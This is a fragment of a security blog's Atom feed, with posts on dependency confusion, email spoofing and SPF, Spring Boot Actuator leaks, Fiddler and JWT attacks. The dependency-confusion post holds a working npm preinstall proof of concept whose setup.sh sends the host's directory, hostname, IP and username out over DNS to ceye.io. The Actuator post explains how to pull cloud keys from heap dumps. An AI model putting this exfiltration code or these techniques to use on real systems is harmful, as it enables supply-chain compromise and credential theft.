+<p> main.js</p>
+<pre><code>const { exec } = require(&quot;child_process&quot;);
+exec(&quot;node index.js  &gt; /dev/null 2&gt;&amp;1 &amp;&amp; sh setup.sh &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
+ if(error){
+  console.log(&quot;error&quot;,error.message);
+  return;
+ }
+ if(getter){
+  console.log(data);
+  return;
+ }
+ console.log(data);
+
+});
+</code></pre>
+<p> package.json</p>
+<pre><code>{
+  &quot;name&quot;: &quot;&lt;npm_package_name&gt;&quot;,
+  &quot;version&quot;: &quot;2.0.0&quot;,
+  &quot;description&quot;: &quot;&quot;,
+  &quot;main&quot;: &quot;main.js&quot;,
+  &quot;scripts&quot;: {
+    &quot;preinstall&quot;: &quot;node build.js&quot;,
+    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;
+  },
+  &quot;author&quot;: &quot;laobai&quot;,
+  &quot;license&quot;: &quot;ISC&quot;,
+  &quot;dependencies&quot;: {
+    &quot;express&quot;: &quot;^4.17.1&quot;,
+    &quot;lodash&quot;: &quot;^4.17.21&quot;
+  }
+}
+</code></pre>
+<p> setup.sh</p>
+<pre><code>#!/usr/bin/bash
+
+pwd | xxd -p | while read ut;do dig $ut.xxx.ceye.io;done;
+b=$(hostname | head | base64) &amp;&amp; dig $b.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
+c=$(curl ifconfig.me | head | base64) &amp;&amp; dig $c.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
+d=$(echo &quot;shineout-mobile&quot; | head | base64) &amp;&amp; dig $d.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
+e=$(whoami | head | base64) &amp;&amp; dig $e.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;
+</code></pre>
+<h1 id="四-防范">四、防范</h1>
+<p>  1、对于第三方依赖包，均在外部公共库进行注册；<br>
+  2、维护内部源，维护依赖包列表，相关私有包只能从内部源中获取；<br>
+  3、对于从外部源获取的包，采用SCA进行扫描（不过现在市面上的SCA均是以比对漏洞库的形式检测，个人认为必要时可以采用SAST代替这部分的扫描任务）。<br>
+  <a href="https://azure.microsoft.com/zh-cn/resources/3-ways-to-mitigate-risk-using-private-package-feeds/">微软白皮书</a></p>
+<h1 id="五-杂谈">五、杂谈</h1>
+<p>  Dependency Confusion作为供应链攻击的一种，该漏洞已经影响了很多大厂<br>
+<img src="https://V-alkoinen.github.io/post-images/1642329462997.png" alt="" loading="lazy"><br>
+<a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610">相关文章</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[邮件伪造]]></title>
+        <id>https://V-alkoinen.github.io/post/you-jian-wei-zao/</id>
+        <link href="https://V-alkoinen.github.io/post/you-jian-wei-zao/">
+        </link>
+        <updated>2021-07-30T08:34:07.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-spf简介">一、SPF简介</h1>
+<p>  <code>SPF</code> ，全称为 <code>Sender Policy Framework</code>，即发件人策略框架。<br>
+  我们都知道，Email通信时，使用的是 SMTP 协议（<code>Simple Mail Transfer Protocol</code>），即简单邮件传输协议。此协议在通信过程中十分简陋，发件人的邮箱地址可以由发信方进行声明，所以协议本身没有很好的安全措施。SPF 出现的目的，就是为了解决 SMTP 的安全短板。</p>
+<h1 id="二-spf原理">二、SPF原理</h1>
+<p>  SPF记录实际上就是一条DNS记录，原理如下：<br>
+  假设邮件服务器收到了一封邮件，发送方的IP为<code>IP_Sender</code>，并且发送方生成发件人为 <code>sender@example.com</code>。为了确认发件人是否是伪造的，邮件服务器会去查询<code>example.com</code>的 SPF 记录。如果该域的 SPF 记录设置允许 IP 为<code>IP_Sender</code>的主机发送邮件，则邮件服务器就会认为这封邮件是合法的；如果不允许，邮件服务器通常会退信，并将其标记为垃圾/仿冒邮件。<br>
+  因为攻击者虽然可以声称他的邮件来自<code>example.com</code>，但是它却无法操作<code>example.com</code>的 DNS 记录，并且也无法伪造自己的 IP 地址。因此 SPF 被各大厂商认可，当下基本所有的邮件服务供应商（Gmail、腾讯邮箱等）都会去验证。</p>
+<h1 id="三-漏洞利用">三、漏洞利用</h1>
+<p> 使用 <a href="https://github.com/jetmore/swaks">Swaks</a>进行邮件伪造<br>
+ <code>swaks --to &lt;target_address&gt; --from &lt;source_address&gt; --body &lt;email_body&gt; --header &lt;email_header&gt;</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1642930934304.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1642930975403.png" alt="" loading="lazy"></p>
+<h1 id="四-spf记录的语法">四、SPF记录的语法</h1>
+<p> 一条 SPF 记录定义了一个或者多个 mechanism，而 mechanism 则定义了哪些 IP 是允许的，哪些 IP 是拒绝的。<br>
+ mechanism共包含以下几类：<br>
+<code>all | ip4 | ip6 | include | a | mx | ptr | exists</code><br>
+ 每个mechanism可以选择以下四种前缀：</p>
+<pre><code>&quot;+&quot;  Pass（通过）
+&quot;-&quot;  Fail（拒绝）
+&quot;~&quot;  Soft Fail（软拒绝）
+&quot;?&quot;  Neutral（中立）
+</code></pre>
+<p> 服务器验证 SPF 记录时，会依次测试每个 mechanism ，如果命中IP，则验证结果由 mechanism 前缀决定，默认前缀为<code>+</code>，如果均没有命中，则结果为 Neutral。除此之外，还有三种情况，具体解释如下（下表中的处理方法仅是 SPF 标准做出的建议）：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">结果</th>
+<th style="text-align:center">含义</th>
+<th style="text-align:center">处理方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Pass</td>
+<td style="text-align:center">发件 IP 是合法的</td>
+<td style="text-align:center">接受来信</td>
+</tr>
+<tr>
+<td style="text-align:center">Fail</td>
+<td style="text-align:center">发件 IP 是非法的</td>
+<td style="text-align:center">退信</td>
+</tr>
+<tr>
+<td style="text-align:center">Soft Fail</td>
+<td style="text-align:center">发件 IP 非法，但是不采取强硬措施</td>
+<td style="text-align:center">接受来信，但是做标记</td>
+</tr>
+<tr>
+<td style="text-align:center">Neutral</td>
+<td style="text-align:center">SPF 记录中没有关于发件 IP 是否合法的信息</td>
+<td style="text-align:center">接受来信</td>
+</tr>
+<tr>
+<td style="text-align:center">None</td>
+<td style="text-align:center">服务器没有设定 SPF 记录</td>
+<td style="text-align:center">接受来信</td>
+</tr>
+<tr>
+<td style="text-align:center">PermError</td>
+<td style="text-align:center">发生了严重错误（例如 SPF 记录语法错误）</td>
+<td style="text-align:center">没有规定</td>
+</tr>
+<tr>
+<td style="text-align:center">TempError</td>
+<td style="text-align:center">发生了临时错误（例如 DNS 查询失败）</td>
+<td style="text-align:center">接受或拒绝</td>
+</tr>
+</tbody>
+</table>
+<h1 id="五-关于mechanisms">五、关于Mechanisms</h1>
+<p> <code>all</code>:表示所有 IP，肯定会命中。因此通常把它放在 SPF 记录的结尾，表示处理剩下的所有情况。</p>
+<pre><code>&quot;v=spf1 -all&quot; 拒绝所有（表示这个域名不会发出邮件）
+&quot;v=spf1 +all&quot; 接受所有（域名所有者认为 SPF 是没有用的，或者根本不在乎它）
+</code></pre>
+<p> <code>ip4</code>:格式为<code>ip4:&lt;ip4-address&gt;</code>或者<code>ip4:&lt;ip4-network&gt;/&lt;prefix-length&gt;</code>，指定一个 IPv4 地址或者地址段。如果<code>prefix-length</code>没有给出，则默认为/32。</p>
+<pre><code>&quot;v=spf1 ip4:192.168.0.1/16 -all&quot;
+只允许在 192.168.0.1 ~ 192.168.255.255 范围内的 IP
+</code></pre>
+<p> <code>ip6</code>:格式和<code>ip4</code>类似，默认的prefix-length是/128。</p>
+<pre><code>&quot;v=spf1 ip6:1080::8:800:200C:417A/96 -all&quot;
+只允许在 1080::8:800:0000:0000 ~ 1080::8:800:FFFF:FFFF 范围内的 IP
+</code></pre>
+<p> <code>a、mx</code>:两者格式相同</p>
+<pre><code>a
+a/&lt;prefix-length&gt;
+a:&lt;domain&gt;
+a:&lt;domain&gt;/&lt;prefix-length&gt;
+</code></pre>
+<p> 会命中相应域名的 a 记录（或 mx 记录）中包含的 IP 地址（或地址段）。如果没有提供域名，则使用当前域名。例如：</p>
+<pre><code>&quot;v=spf1 mx -all&quot;
+允许当前域名的 mx 记录对应的 IP 地址。
+
+&quot;v=spf1 mx mx:deferrals.example.com -all&quot;
+允许当前域名和 deferrals.example.com 的 mx 记录对应的 IP 地址。
+
+&quot;v=spf1 a/24 -all&quot;
+类似地，这个用法则允许一个地址段。
+
+v=spf1 a mx ip4:173.194.72.103 -all
+混合使用，支持当前域名的a记录和mx记录，同时也支持一个指定的IP地址
+</code></pre>
+<p> <code>include</code>:格式为<code>include:&lt;domain&gt;</code>，表示引入<code>&lt;domain&gt;</code>域名下的 SPF 记录。注意，如果该域名下不存在 SPF 记录，则会导致一个PermError结果。</p>
+<pre><code>&quot;v=spf1 include:example.com -all&quot; 即采用和 example.com 完全一样的 SPF 记录
+</code></pre>
+<p> <code>exists</code>:格式为<code>exists:&lt;domain&gt;</code>。将对<code>&lt;domain&gt;</code>执行一个 A 查询，如果有返回结果（无论结果是什么），都会看作命中。<br>
+ <code>ptr</code>:格式为<code>ptr</code>或者<code>ptr:&lt;domain&gt;</code>。使用ptr机制会带来大量很大开销的 DNS 查询，所以连官方都不推荐使用它。<br>
+ <code>Modifiers</code>:SPF 记录中还可以包括两种可选的 modifier；一个 modifier 只能出现一次。</p>
+<pre><code>#redirect
+格式为redirect=&lt;domain&gt;,将用给定域名的 SPF 记录替换当前记录。
+
+#exp
+格式为exp=&lt;domain&gt;，目的是如果邮件被拒绝，可以给出一个消息。而消息的具体内容会首先对&lt;domain&gt;执行 TXT 查询，然后执行宏扩展得到。
+</code></pre>
+<pre><code>v=spf1:表示采用 SPF 1 版本，现在它的最新版本就是第 1 版。
+</code></pre>
+<h1 id="六-添加spf记录">六、添加SPF记录</h1>
+<p> 如果想通过自己的域名发邮件，那么建议为它添加 SPF 记录，通常可以通过域名供应商提供的域名解析服务进行修改。不过有很多域名供应商并不支持 SPF 记录，我们也可以创建为一条 TXT 记录。至于合法的 IP ，如果你使用的第三方域名邮箱服务，会有固定的文档告诉我们如何填写。<br>
+ SPF 记录本质上是一个 DNS 记录，所以并不是修改之后立即生效的——通常需要几个小时的时间。</p>
+<h1 id="七-参考">七、参考</h1>
+<p> <a href="http://www.openspf.org/">open SPF</a><br>
+ <a href="http://www.openspf.org/Why">SPF Why</a><br>
+ <a href="http://tools.bevhost.com/spf/">Beveridge SPF Test</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Spring Boot Actuator 未授权访问]]></title>
+        <id>https://V-alkoinen.github.io/post/spring-boot-actuator-wei-shou-quan-fang-wen/</id>
+        <link href="https://V-alkoinen.github.io/post/spring-boot-actuator-wei-shou-quan-fang-wen/">
+        </link>
+        <updated>2021-04-09T08:22:23.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-actuator简介">一、Actuator简介</h1>
+<p>  Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。<br>
+<img src="https://V-alkoinen.github.io/post-images/1641718653990.png" alt="" loading="lazy"></p>
+<h1 id="二-spring-boot框架站点识别">二、Spring Boot框架站点识别</h1>
+<h3 id="21-通过-web-应用程序网页标签的图标">2.1、通过 web 应用程序网页标签的图标</h3>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1641720263949.png" alt="" loading="lazy"></figure>
+<h3 id="22-通过-spring-boot-框架默认报错页面">2.2、通过 Spring Boot 框架默认报错页面</h3>
+<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1641720440742.png" alt="" loading="lazy"></figure>
+<h1 id="三-spring-boot关注点及利用">三、Spring Boot关注点及利用</h1>
+<h3 id="31-httptrace-泄露cookie">3.1、/httptrace 泄露cookie</h3>
+<figure data-type="image" tabindex="3"><img src="https://V-alkoinen.github.io/post-images/1642228750817.png" alt="" loading="lazy"></figure>
+<h3 id="32-v2api-docs-泄露接口文档">3.2、/v2/api-docs 泄露接口文档</h3>
+<figure data-type="image" tabindex="4"><img src="https://V-alkoinen.github.io/post-images/1642228877170.png" alt="" loading="lazy"></figure>
+<h3 id="33-env-泄露环境变量信息">3.3、/env 泄露环境变量信息</h3>
+<p>  可以获取OSS或S3 bucket信息（ali.oss.endpoint、ali.oss.bucketname、ali.oss.fileDir）<br>
+<img src="https://V-alkoinen.github.io/post-images/1642229224665.png" alt="" loading="lazy"></p>
+<h3 id="34-heapdump-内存dump文件-泄露jdbc连接地址-数据库信息-存储桶相关aksk">3.4、/heapdump (内存dump文件) 泄露JDBC连接地址、数据库信息、存储桶相关AK/SK</h3>
+<p> 使用工具：jvisualvm<br>
+ 数据库相关信息可以搜索：com.mysql.jdbc.JDBC4DatabaseMetaData -&gt; conn<br>
+ OSS-AK：com.aliyun.oss.common.auth.DefaultCredentialProvider -&gt; creds -&gt; accessKeyId<br>
+ OSS-SK：com.aliyun.oss.common.auth.DefaultCredentialProvider -&gt; creds -&gt; secretAccessKey<br>
+<img src="https://V-alkoinen.github.io/post-images/1642230981749.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1642230889996.png" alt="" loading="lazy"><br>
+ 配合/env拿到的信息可以直接接管OSS（S3同理）<br>
+ 同时如果配置有误可以直接利用AK和SK接管实例<br>
+ 利用工具：<a href="https://github.com/iiiusky/alicloud-tools">alicloud-tools</a></p>
+<h1 id="四-修复方案">四、修复方案</h1>
+<p> 关闭所有包含敏感信息的endpoint<br>
+ spring boot 1.x<br>
+ 仅保留health</p>
+<pre><code>endpoints.enabled: false
+endpoints.health.enabled: true
+</code></pre>
+<p> spring boot 2.x<br>
+ 仅保留health</p>
+<pre><code>management.endpoints.enabled-by-default: false
+management.endpoint.health.enabled: true
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Fiddler]]></title>
+        <id>https://V-alkoinen.github.io/post/fiddler/</id>
+        <link href="https://V-alkoinen.github.io/post/fiddler/">
+        </link>
+        <updated>2021-04-01T11:28:35.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-下载">一、下载</h1>
+<p><a href="https://www.telerik.com/download/fiddler">https://www.telerik.com/download/fiddler</a></p>
+<h1 id="二-安装后展示host-ip">二、安装后展示HOST IP</h1>
+<h3 id="21-点击fiddlerscript">2.1、点击FiddlerScript</h3>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1641469393421.png" alt="" loading="lazy"></figure>
+<h3 id="22-找到以下方法">2.2、找到以下方法：</h3>
+<p><code>static function Main()</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1641469501118.png" alt="" loading="lazy"></p>
+<h3 id="23-添加如下代码">2.3、添加如下代码：</h3>
+<p><code>FiddlerObject.UI.lvSessions.AddBoundColumn(&quot;HOST IP&quot;, 120, &quot;X-HostIP&quot;);</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1641469558914.png" alt="" loading="lazy"></p>
+<h3 id="24-点击save-script重新打开fiddler">2.4、点击Save Script，重新打开fiddler</h3>
+<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1641469671973.png" alt="" loading="lazy"></figure>
+<h1 id="三-配置https">三、配置HTTPS</h1>
+<h3 id="31-tools-options-connections勾选allow-remote-computers-to-connect允许远程发送请求">3.1、Tools-&gt;Options-&gt;Connections，勾选Allow remote computers to connect（允许远程发送请求）</h3>
+<figure data-type="image" tabindex="3"><img src="https://V-alkoinen.github.io/post-images/1641470406744.png" alt="" loading="lazy"></figure>
+<h3 id="32-tools-options-https勾选decrypt-https-traffic允许抓取https请求">3.2、Tools-&gt;Options-&gt;HTTPS，勾选Decrypt HTTPS traffic（允许抓取HTTPS请求）</h3>
+<figure data-type="image" tabindex="4"><img src="https://V-alkoinen.github.io/post-images/1641470520246.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JWT攻击]]></title>
+        <id>https://V-alkoinen.github.io/post/jwt-gong-ji/</id>
+        <link href="https://V-alkoinen.github.io/post/jwt-gong-ji/">
+        </link>
+        <updated>2020-11-03T11:00:23.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-jwt概念">一、JWT概念</h1>
+<p>Json Web Token简称JWT，顾名思义JWT是用于身份验证的。这是一种无状态身份验证机制，因为用户状态永远不会保存在服务器内存中。服务器受保护的路由将在授权头中检查有效的JWT，如果存在，则允许用户访问受保护的资源。<br>
+JWT有JWS与JWE两种实体形式，我们一般说的JWT其实都是JWS。<br>
+<img src="https://V-alkoinen.github.io/post-images/1641294341492.jpg" alt="" loading="lazy"></p>
+<h1 id="二-jwt结构">二、JWT结构</h1>
+<p>JWT一般是如下的形式：<br>
+<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</code><br>
+通过.分为三段,分别是 Header、Payload、Signature<br>
+<img src="https://V-alkoinen.github.io/post-images/1641294629263.png" alt="" loading="lazy"></p>
+<h2 id="21-header">2.1、header</h2>
+<pre><code>// 包括类别（typ）、加密算法（alg）；
+{
+    &quot;alg&quot;: &quot;HS256&quot;,
+    &quot;typ&quot;: &quot;JWT&quot;
+}
+</code></pre>
+<p>jwt的头部包含两部分信息：<br>
+声明类型，这里是jwt<br>
+声明加密的算法 通常直接使用 HMAC SHA256<br>
+然后将头部进行base64加密（该加密是可以对称解密的)，构成了第一部分。</p>
+<h2 id="22-payload">2.2、payload</h2>
+<p>第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。<br>
+Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。<br>
+Public claims : 可以随意定义。<br>
+Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。<br>
+payload进行Base64编码就得到JWT的第二部分</p>
+<h2 id="23-signature">2.3、signature</h2>
+<p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：<br>
+header (base64后的)<br>
+payload (base64后的)<br>
+secret</p>
+<pre><code>// 根据alg算法与私有秘钥进行加密得到的签名字串；
+// 这一段是最重要的敏感信息，只能在服务端解密；
+HMACSHA256(
+base64UrlEncode(header) + &quot;.&quot; +
+base64UrlEncode(payload),
+SECREATE_KEY
+)
+</code></pre>
+<p>signature的目的：signature实际上是对header以及payload内容进行签名。所以，如果有人对header以及payload的内容解码之后进行修改，再进行编码的话，那么新的header和payload的签名和之前的签名就将是不一样的。而且，如果不知道服务器加密的时候用的密钥的话，得出来的签名也一定会是不一样的。 这样就能保证token不会被篡改。</p>
+<h1 id="三-jwt攻击手段">三、JWT攻击手段</h1>
+<h2 id="31-修改算法攻击">3.1、修改算法攻击</h2>
+<h3 id="311-修改算法为none">3.1.1、修改算法为None</h3>
+<p>签名算法保证了JWT在传输的过程中不被恶意用户修改，但是header部分的alg字段可被修改为none，一些JWT库支持none算法，即没有签名算法，当alg为none时服务端不会进行签名校验。<br>
+将alg修改为none后，去掉JWT中的signature数据（仅剩header + '.' + payload + '.'）然后加密提交到服务端即可伪造任意数据。</p>
+<h3 id="312-修改rsa加密算法为hmac">3.1.2、修改RSA加密算法为HMAC</h3>
+<p>首先我们知道非对称密码才存在公私钥，而对称密码只有一个密钥，算法RS256为非对称加密，而HS256为对称加密。<br>
+在HMAC和RSA算法中，都是使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。<br>
+现在我们假设有这样一种情况，一个Web应用，在JWT传输过程中使用RSA算法，密钥pem对JWT token进行签名，公钥pub对签名进行验证。</p>
+<pre><code>{
+    &quot;alg&quot; : &quot;RS256&quot;,
+    &quot;typ&quot; : &quot;jwt&quot;
+}
+</code></pre>
+<p>通常情况下密钥pem是无法获取到的，但是公钥pub却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即：</p>
+<pre><code>{
+    &quot;alg&quot; : &quot;HS256&quot;,
+    &quot;typ&quot; : &quot;jwt&quot;
+}
+</code></pre>
+<p>同时使用获取到的公钥pub作为算法的密钥，对token进行签名，发送到服务器端。<br>
+服务器端会将RSA的公钥（pub）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。</p>
+<h2 id="32-密钥爆破攻击">3.2、密钥爆破攻击</h2>
+<p>使用现有工具：c-jwt-cracker<br>
+<img src="https://V-alkoinen.github.io/post-images/1641297159619.png" alt="" loading="lazy"><br>
+对 JWT 的密钥爆破需要在一定的前提下进行：<br>
+1.知悉JWT使用的加密算法<br>
+2.一段有效的、已签名的token<br>
+3.签名用的密钥不复杂（弱密钥）</p>
+]]></content>
+    </entry>
 </feed>
